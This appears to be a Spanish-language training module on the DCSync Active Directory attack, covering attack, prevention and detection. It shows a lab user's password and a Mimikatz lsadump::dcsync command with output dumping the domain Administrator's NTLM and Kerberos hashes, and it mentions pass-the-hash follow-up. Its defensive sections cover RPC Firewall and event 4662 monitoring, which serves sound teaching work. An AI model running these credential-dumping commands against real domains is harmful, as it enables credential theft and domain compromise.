# DCSync

# **Descripción**

`DCSync`es un ataque que los agentes de amenaza utilizan para hacerse pasar por un controlador de dominio y realizar replicación con un controlador de dominio objetivo para extraer hash de contraseña de Active Directory. El ataque se puede realizar tanto desde la perspectiva de una cuenta de usuario como desde una computadora, siempre que tengan los permisos necesarios asignados, que son:

- `Replicating Directory Changes`
- `Replicating Directory Changes All`

---

# **Ataque**

Utilizaremos al usuario`Rocky`(cuya contraseña es`Slavi123`) para mostrar el`DCSync`ataque. Cuando revisamos los permisos de Rocky, vemos que tiene`Replicating Directory Changes`y`Replicating Directory Changes All`Asignado:

![](https://academy.hackthebox.com/storage/modules/176/A7/DCPermission.png)

Primero, necesitamos comenzar un nuevo shell de comando que se ejecute como Rocky:

Dcsync

```
C:\Users\bob\Downloads>runas /user:eagle\rocky cmd.exe

Enter the password for eagle\rocky:
Attempting to start cmd.exe as user "eagle\rocky" ...

```

![](https://academy.hackthebox.com/storage/modules/176/A7/Rockyprompt.png)

Posteriormente, necesitamos usar`Mimikatz`, una de las herramientas con una implementación para realizar DCSYNC. Podemos ejecutarlo especificando el nombre de usuario cuyo hash contraseña queremos obtener si el ataque es exitoso, en este caso, el "administrador" del usuario:

Dcsync

```
C:\Mimikatz>mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator

[DC] 'eagle.local' will be the domain
[DC] 'DC2.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 07/08/2022 11.24.13
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6fd69313922373216cdbbfa823bd268d

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-FM93RI8QOKQAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1c4197df604e4da0ac46164b30e431405d23128fb37514595555cca76583cfd3
      aes128_hmac       (4096) : 4667ae9266d48c01956ab9c869e4370f
      des_cbc_md5       (4096) : d9b53b1f6d7c45a8

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-FM93RI8QOKQAdministrator
    Credentials
      des_cbc_md5       : d9b53b1f6d7c45a8

```

![](https://academy.hackthebox.com/storage/modules/176/A7/AdminHash.png)

Es posible especificar el`/all`Parámetro en lugar de un nombre de usuario específico, que arrojará los hash de todo el entorno AD. Podemos realizar`pass-the-hash`con el hash obtenido y autenticarse contra cualquier controlador de dominio.

---

# **Prevención**

Lo que los abusos de DCSYNC es una operación común en entornos de activo directorio, ya que las replicaciones ocurren entre los controladores de dominio todo el tiempo; Por lo tanto, prevenir DCSYNC fuera de la caja no es una opción. La única técnica de prevención contra este ataque es usar soluciones como el[Firewall RPC](https://github.com/zeronetworks/rpcfirewall), un producto de terceros que puede bloquear o permitir llamadas específicas de RPC con granularidad robusta. Por ejemplo, usando`RPC Firewall`, solo podemos permitir réplicas de controladores de dominio.

---

# **Detección**

Detectar DCSYNC es fácil porque cada replicación del controlador de dominio genera un evento con la ID`4662`. Podemos recoger solicitudes anormales inmediatamente al monitorear esta ID de evento y verificar si la cuenta del iniciador es un controlador de dominio. Aquí está el evento generado desde antes cuando corrimos`Mimikatz`; Sirve como una bandera que una cuenta de usuario está realizando este intento de replicación:

![](https://academy.hackthebox.com/storage/modules/176/A7/DetectDCSync.png)

Dado que las replicaciones ocurren constantemente, podemos evitar falsos positivos asegurando los siguientes:

- O la propiedad`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`o`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`es[presente en el evento](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb).
- Sistemas/cuentas de lista blanca con una razón comercial (válida) para replicar, como`Azure AD Connect`(Este servicio replica constantemente controladores de dominio y envía los hash de contraseña obtenidos a Azure AD).